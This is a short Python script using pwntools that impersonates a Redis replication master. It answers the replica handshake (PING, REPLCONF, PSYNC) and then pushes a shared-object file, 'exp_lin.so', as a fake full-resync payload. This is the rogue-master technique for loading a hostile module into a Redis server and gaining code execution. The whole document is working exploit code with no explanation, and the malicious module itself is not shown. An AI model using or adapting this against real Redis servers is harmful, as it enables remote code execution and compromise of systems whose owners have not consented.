from pwn import *

context.log_level = 'debug'

CLRF = '\r\n'
payload = None
with open('exp_lin.so', 'rb') as f:
    payload = f.read()
print('[*] Exploit setup')

l = listen(8888)

c = l.wait_for_connection()

print('[*] Connection was made to our server')

while True:
    data = c.recv().decode()
    if 'PING' in data:
        print('[*] Received ping')
        c.send('+PONG' + CLRF)
    elif 'REPLCONF' in data:
        print('[*] Received replconf')
        c.send('+OK' + CLRF)
    elif 'PSYNC' in data or  'SYNC' in data:
        print('[*] Received sync')
        resp = '+FULLRESYNC ' + 'Z' * 40 + '0' + CLRF
        resp += '$' + str(len(payload)) + CLRF
        resp = resp.encode()
        resp += payload + CLRF.encode()
        c.send(resp)
        print('[*] Sent sync payload')
    else:
        print('[*] Received unknown request:', data)
